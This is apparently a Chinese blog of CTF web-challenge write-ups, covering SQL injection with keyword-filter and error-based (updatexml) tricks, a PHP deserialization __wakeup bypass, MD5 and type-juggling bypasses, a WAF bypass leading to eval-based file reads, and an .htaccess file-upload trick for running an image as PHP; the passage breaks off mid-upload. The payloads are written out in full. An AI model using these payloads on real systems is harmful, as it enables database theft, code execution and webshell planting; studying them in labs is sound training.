<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; oorr <span class="number">1</span>=<span class="number">2</span>#</span><br></pre></td></tr></table></figure>
<p><code>！由于知道会把or替换为空,那么后续我们均可以以这个思路绕过对其他关键字的过滤。</code><br><code>3、接着判断列数</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; oorrder <span class="keyword">by</span> <span class="number">4</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>发现对by也存在过滤,那就在by中间插入or即可(原因是它应该是正则去匹配的,且只匹配一次,那我就第一次不让他匹配到即可)。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; oorrder bory <span class="number">4</span>(<span class="number">3</span>)#</span><br></pre></td></tr></table></figure>
<p>判断列数为3列。<br><code>4、爆数据库名字</code><br>先判断在1、2、3的哪个位置爆出数据。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p>爆数据库名字</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,database(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc3e0c458853aef7ca092.jpg"><br><code>5、爆表</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> frorom infoorrmation_schema.tables wherore table_schema=&#x27;geek&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc3f0c458853aef7cce63.jpg"><br><code>6、爆列</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> frorom infoorrmation_schema.columns wherore table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/654cc400c458853aef7cfe4a.jpg"><br><code>7、直接爆flag</code></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&#x27; unioorn seleorct <span class="number">1</span>,group<span class="constructor">_concat(<span class="params">username</span>)</span>,group<span class="constructor">_concat(<span class="params">passwoorrd</span>)</span> frorom b4bsql# </span><br></pre></td></tr></table></figure>
<p>查看源码获取flag<br><img src="https://pic.imgdb.cn/item/654cc40ec458853aef7d26ba.jpg"><br><code>learn by ashash</code></p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开靶机,发现网站正上方提示,猜测存在网站备份文件,毫不犹豫进行目录扫描。<br><code>但是：</code>御剑以及kali上的dirb、nikto好像都扫不出来。<br>这里运用了另一款目录扫描工具:dirsearch。<br>安装以及使用:<a href="https://blog.csdn.net/whatday/article/details/128305168">https://blog.csdn.net/whatday/article/details/128305168</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http:<span class="regexp">//</span>target -e php -t <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p>扫描过程中发现了疑似flag的文件:flag.php。<br><img src="https://pic.imgdb.cn/item/654da188c458853aefe61ef0.jpg"><br>细看才发现大小为0B…..额好家伙。<br>接着扫描,发现了网站备份文件:<a href="http://www.zip,下载下来便可以代码审计了./">www.zip,下载下来便可以代码审计了。</a><br><img src="https://pic.imgdb.cn/item/654da194c458853aefe63ba4.jpg"><br><code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显,骗人的。<br><code>index.php</code><br>关键是:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">  <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>应该是这里接收序列化的内容然后传输给class.php。那么关键flag相关的应该就是class.php了。<br><code>class.php</code><br>关键代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>重点代码解读:</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">Private</span> 是一种可见性修饰符，<span class="keyword">private</span>与<span class="keyword">public</span>不同，<span class="keyword">private</span>修饰的方法和数据域被限定只能在自己的类中被访问，即使在同一个包中也不能被其它类访问，<span class="keyword">public</span>则可以运用在类或者类的成员上。</span><br><span class="line"><span class="keyword">private</span>：用于声明私有变量(序列化后会多<span class="number">%00</span>)	<span class="keyword">public</span>：用于声明全局变量</span><br><span class="line"><span class="number">2</span>、__construct()<span class="comment">//构造函数,创建对象时调用</span></span><br><span class="line"><span class="number">3</span>、__destruct()<span class="comment">//对象被销毁时以及调用 serialize () 触发</span></span><br><span class="line"><span class="number">4</span>、__wakeup () <span class="comment">// 调用 unserialize (),即反序列化前触发</span></span><br></pre></td></tr></table></figure>
<p>那么就可以构造PHP代码生成payload。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意将显示不出来的符号换成%00。<br>payload：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>但输入后却不可以获取flag,思考后,发现是class.php的__wakeup()在反序列化前调用了,那么username就被换成了guest。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php：</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以目前需要绕过wakeup()。那么怎么绕过呢？<br><code>如果对象属性的个数的值大于真实的属性个数的时候会绕过__wakeup的执行,把对象属性的值(这里是Name)即2改为大于2的数字就可以实现绕过</code><br>优化后的payload:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>键入网址栏即可获取flag。<br><img src="https://pic.imgdb.cn/item/654da19cc458853aefe64d2a.jpg"><br><code>1、我发现根据对方网站的代码构造生成payload的代码时,对方网站的代码中若含有方法,我们而已不理这些方法,直接构造一个只含有属性值的类</code><br><code>2、注意各种魔术方法在什么时候被调用,从而可以实现绕过一些干扰我们的魔术方法。还有就是注意private与public</code></p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>这道题很莫名其妙就输出了flag,很懵逼。<br>题目名字叫做backupfile,中文备份文件嘛,直接目录扫描先。<br>扫到一个index.php.bak,打开代码审计。<br>方便起见,我直接在注释里面里写。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">&quot;flag.php&quot;</span>;<span class="regexp">//</span>证明满足一定条件会输出flag.php的内容</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;<span class="regexp">//</span>以属性key接收用户键入的值</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];<span class="regexp">//</span>赋值给<span class="variable">$key</span></span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;<span class="regexp">//</span>检查变量是否为数值。如果为数值返回真；反之返回假。</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);<span class="regexp">//</span>这里只允许输入纯数字</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);<span class="regexp">//</span>将输入的值强制转为整数</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;<span class="regexp">//</span><span class="variable">$key</span>与<span class="variable">$str</span>相等时才输出flag</span><br><span class="line">        echo <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>几个函数的作用</code><br>1、is_numeric():检查变量是否为数值。如果为数值返回真；反之返回假。<br>2、intval():PHP中常用的一个强制类型转换函数，用于将变量的值转换为整数。<br>这里有点懵,我刚开始是将$str的值直接复制下来赋值给$key的,但是存在验证,获取flag失败。<br>但是后面我就想:如果输入纯数字会怎么样,那我就直接把123后面的那一串删掉了，没想到直接爆出flag。<br><code>这里我上网查阅了资料才理解</code><br><code>原来：</code> &#x3D;&#x3D; 是一个弱比较（高版本php弱比较没了）<br>&#x3D;&#x3D;&#x3D;(强比较) 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。(类型不相等直接不比较值)<br>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较。(把类型转为相等再比较)<br>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行。<br>所以这里str &#x3D; “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”在和数字比较时，str就转换称了123<br>所以str&#x3D;&#x3D;flag。这里intval()也发挥了重要作用，将$key取整变成int型</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>开启靶机,是一个简易的网站页面，先看源码吧。<br>存在一个”pay.php”，估计是关键的物件，点进去看一下。<br>依然是个普通的界面，继续查看源码，这一看不要紧，看到关键解题信息<br><img src="https://pic.imgdb.cn/item/654de30ac458853aef9f89fc.jpg"><br>这段代码估计是pay.php的源码，这里泄露了。<br>意思是以属性password接收，之后强制转换为数字，如果&#x3D;404可能会输出flag。<br>这里直接抓包,把get提交方式改为post,加上password。<br><img src="https://pic.imgdb.cn/item/654de328c458853aef9fe219.jpg"><br>但是发现还是没有用户权限，那就尝试把cookie值的0改为1(<code>做题多了自然会知道--迪师傅</code>)<br>成功连上用户，但是发现数据没有传送成功。<br><img src="https://pic.imgdb.cn/item/654de336c458853aefa00c74.jpg"><br><code>这里因为前面是get，你直接修改方法为post但还是缺少必要数据</code><br>加上</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span><br></pre></td></tr></table></figure>
<p>接着发包，成功传送，但是发现不可为纯数字，突然想到不必传送纯数字，因为后面的intval()会把我们输入的password强制转为整数哈哈。<br><img src="https://pic.imgdb.cn/item/654de37fc458853aefa0ea13.jpg"><br>成功登录，但发现好像需要我们给钱。那就给他！<br><img src="https://pic.imgdb.cn/item/654de3a0c458853aefa14928.jpg"><br>发现数字过长，那就改短点？<br><img src="https://pic.imgdb.cn/item/654de3a0c458853aefa14928.jpg"><br>tnnd，戏耍我？上网寻求大佬的帮助，发现这里应该是使用strcmp()函数比较字符串的<br><code>那我把字符串改为数组，然后输入任意价格不就行了？</code><br>我直接0元购，bug到flag。<br><img src="https://pic.imgdb.cn/item/654de3d9c458853aefa1ecd8.jpg"><br><code>总结</code><br>1、数据包提交方式由get-&gt;post：首先把头部的get改为post，然后加上Content-Type: application&#x2F;x-www-form-urlencoded，在数据包的最后加上你要发送的数据。<br>2、flag不是一遍就可以得出来的，要敢于利用对方网站代码的漏洞进行尝试。</p>
<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><code>这道题是报错盲注</code><br>开启靶机，依然是登录框。<br>密码随意填，用户名填1|1’测试是字符型还是数字型。<br>这里填1’的时候报错，证明是字符型。<br><img src="https://pic.imgdb.cn/item/65597718c458853aef66db02.jpg"><br>这里常规测试：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<p>发现存在字符被过滤。<br>初步猜测是对空格字符存在过滤，应该是空格后不能有数据。<br>常规的联合注入不适用（这里也用了sqlmap跑了一下，map说测试不出注入点hh）<br>那么可以采用报错盲注的方式。</p>
<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>updatexml()</code><br>首先先测试updatexml函数可不可用。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p>爆数据库名字<br><img src="https://pic.imgdb.cn/item/6559772bc458853aef67117f.jpg"><br>成功爆出，那么这个思路可以继续使用。<br>爆数据库版本</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,version()),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597733c458853aef6728b5.jpg"><br>爆表</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">table_name</span>))from(<span class="name">information_schema</span>.tables)where(<span class="name">table_schema</span>)like(<span class="name">database</span>()))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6559774cc458853aef677495.jpg"><br>爆字段</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">column_name</span>))from(<span class="name">information_schema</span>.columns)where(<span class="name">table_name</span>)like(&#x27;H4rDsq1&#x27;))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597760c458853aef67b331.jpg"><br><code>爆flag</code></p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">group_concat</span>(<span class="name">password</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p>成功爆出flag，但是很奇怪，只有一半（输出限制）。<br>那么先爆左边</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">left</span>(<span class="name">password</span>,<span class="number">30</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597771c458853aef67e5f9.jpg"><br>再爆右边</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">d&#x27;or(<span class="name">updatexml</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span>(<span class="name">right</span>(<span class="name">password</span>,<span class="number">30</span>))from(<span class="name">H4rDsq1</span>))),<span class="number">1</span>))#</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/65597780c458853aef6816bb.jpg"><br><code>注意：这里的右半部分可能会包括左半部分，看清楚再拼接</code><br>这样即可获取flag。</p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><code>1、开启靶机，是一个简单的文本输入框，这里我先一顿乱输入，发现一点反应都没有，查看源代码也没有可以利用地方，那么就尝试抓包。</code><br>发现与题目搭边的md5关键字<br><img src="https://pic.imgdb.cn/item/6561630ec458853aef80f8e3.jpg"><br><code>2、那么这里首先了解一下md5函数的意义。</code><br>md5(string,raw)<br>参数以及描述<br>string 必需。要计算的字符串。<br>raw 可选。<br>默认不写为FALSE，32位16进制的字符串<br>TRUE，16位原始二进制格式的字符串<br> 32位16进制字符串的意思是：将MD5加密得到的128 位长度的”指纹信息”，以每4位为一组，分为32组，每组以转换为16进制，进行转换得到一个32位的字符串。<br>总的来说就是我们平时看到的MD5加密的结果<br>16位原始二进制格式的字符串的意思是：将MD5加密得到的128 位长度的”指纹信息”分组转化为16位的一个字符串，然后两个字符为一组，依照ACILL码转化为字符串。<br><code>可以这样理解：raw为true时，相当于在raw值为false时，再进行一次计算</code><br><code>3、我们的目标就是要找一个字符串取32位16进制的md5值里带有276f7227这个字段的</code><br><code>为什么有这个思路？</code><br>因为首先看到函数的raw字段值为true，所以就是把md5加密后再输出成一个8位16进制，而前几位是276f7227，276f7227经过这道题目的函数处理后，会还原成’or’,相当于是万能密码了。<br><a href="https://blog.csdn.net/weixin_73560599/article/details/131998887">https://blog.csdn.net/weixin_73560599/article/details/131998887</a><br><a href="https://www.cnblogs.com/Rammstein-and-rock/p/16513692.html">https://www.cnblogs.com/Rammstein-and-rock/p/16513692.html</a><br>借助其他师傅，发现了符合条件的字符串：ffifdyop，做md5后：276f722736c95d99e921722cf9ed621c，然后就会实现绕过。<br><code>4、在框内输入ffifdyop</code><br>成功跳转到另一个界面<br><img src="https://pic.imgdb.cn/item/6561631dc458853aef812152.jpg"><br>查看源码<br><img src="https://pic.imgdb.cn/item/6561632dc458853aef814c31.jpg"><br><code>5、数组绕过</code><br>md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null<br>比如将两个数组的md5值进行比较<br>md5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)<br>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样<br>null &#x3D;&#x3D;&#x3D; null<br>结果返回true,也就是说数组的md5值进行比较时,结果相等<br>数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(&#x3D;&#x3D;&#x3D;)<br>进行数组绕过<br>?a[]&#x3D;1&amp;b[]&#x3D;2,成功跳转<br><img src="https://pic.imgdb.cn/item/65616339c458853aef816e3f.jpg"><br><code>6、同样，只不过是以post传输数据</code><br><img src="https://pic.imgdb.cn/item/6561633cc458853aef81786a.jpg"><br><code>主要是第一步比较难以想出来，涨知识了</code><br>md5相关绕过学习文章<br><a href="https://blog.csdn.net/LYJ20010728/article/details/116779357">https://blog.csdn.net/LYJ20010728/article/details/116779357</a></p>
<h2 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>感谢这位师傅的文章：<a href="https://blog.csdn.net/weixin_52116519/article/details/124212036">https://blog.csdn.net/weixin_52116519/article/details/124212036</a><br><code>1、前置知识</code><br>原理1：PHP的字符串解析特性<br>PHP将查询字符串（在URL或正文中）转换为内部$_GET或关联数组$_POST。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。<br>例如：<br>如何实现：&#x2F;?foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。<br>&#x2F;? foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个空格<br>&#x2F;?+foo&#x3D;bar变成Array([foo]&#x3D;&gt; “bar”)。 &#x2F;&#x2F;?号后有一个+号<br><code>php在解析的时候，会先把空格(+)去掉，然后解析</code><br>原理2：scandir()列出目录和文件,var_dump()用于输出<br>scandir()函数返回指定目录中的文件和目录的数组。<br>scandir(&#x2F;)相当于ls &#x2F;<br>var_dump()相当于echo<br>原理3：file_get_contents()读取并输出文件内容<br>例如 file_get_contents(&#x2F;flag.php)，读取&#x2F;flag.php的代码<br><code>2、分析</code><br>开启靶机，发现是一个计算机的界面，那么就正常计算，发现可以实现；输入其他则无回显。<br>查看源代码，看源码，发现有 waf 和路径<br><img src="https://pic.imgdb.cn/item/65616dd0c458853aefa051e0.jpg"><br>访问这个路径，是一段源代码<br><img src="https://pic.imgdb.cn/item/65616de2c458853aefa082c5.jpg"><br>大概意思是：GET传入一个num，并且对num的值进行黑名单过滤，最后eval()执行。但是测试过后，黑名单过滤的不止源码列出来的。<br>输入字符，直接被waf拦截<br><img src="https://pic.imgdb.cn/item/65616debc458853aefa09aca.jpg"><br>应该是这样：当检测到用户输入数据时，首先时waf进行检测，通过后就是这个网站的后端代码继续正则检测。<br><code>3、斩题</code><br><code>原理一利用</code><br>首先绕过waf对于num属性的监听，利用原理一<br><img src="https://pic.imgdb.cn/item/65616df5c458853aefa0b4cd.jpg"><br>由于waf原先是监听检测”num”，现在换成了” num”，成功绕过waf检测；但是php在解析的时候，会先把空格去掉，然后解析，这样实现绕过兼运行代码。<br><code>原理二利用</code><br>接下来我们尝试读取网站的目录结构</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(<span class="number">47</span>)))</span><br><span class="line">//相当于? num=<span class="keyword">system</span>(ls /)。chr(<span class="number">47</span>)=&quot; / &quot;<span class="comment">--ASCLL码值。</span></span><br></pre></td></tr></table></figure>
<p><code>注意：函数内部的具体内容要使用ASCLL码绕过这个网站的后端代码继续正则检测</code><br>发现flag存在的目录<br><img src="https://pic.imgdb.cn/item/65616dffc458853aefa0cbed.jpg"><br><code>原理三的利用</code></p>
<figure class="highlight gml"><table><tr><td class="code"><pre><span class="line">? num=file_get_contents(<span class="built_in">chr</span>(<span class="number">47</span>).<span class="built_in">chr</span>(<span class="number">102</span>).<span class="built_in">chr</span>(<span class="number">49</span>).<span class="built_in">chr</span>(<span class="number">97</span>).<span class="built_in">chr</span>(<span class="number">103</span>).<span class="built_in">chr</span>(<span class="number">103</span>))<span class="comment">//多个字符间不可使用空格，会被正则匹配到，所以换成.连接</span></span><br></pre></td></tr></table></figure>
<p><code>4、成功获取到flag</code><br><img src="https://pic.imgdb.cn/item/65616e0fc458853aefa0f9c8.jpg"><br><code>学习连接</code><br>利用PHP的字符串解析特性Bypass：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>开启靶机，是一个文件上传的界面。<br><code>1、首先常规测试。</code><br>直接上传php文件，发现直接被检测到拦截，尝试常规的思路进行绕过，都被打道回府。<br><img src="https://pic.imgdb.cn/item/6564070bc458853aef101b70.jpg"><br><img src="https://pic.imgdb.cn/item/65640718c458853aef103978.jpg"><br><code>2、配置文件.htaccess绕</code><br>那么这里就可以上传一个配置文件，以.htaccess命名，内容为：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;shell.png&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传一个.htaccess文件,这个.htaccess文件的作用就是把这个图片文件解析成php代码执行。<br>直接上传即可，注意，MIME值要抓包修改。<br><img src="https://pic.imgdb.cn/item/6564072ac458853aef1061db.jpg"><br>成功上传。<br><code>3、然后上传一个图片马</code><br>内容是</p>
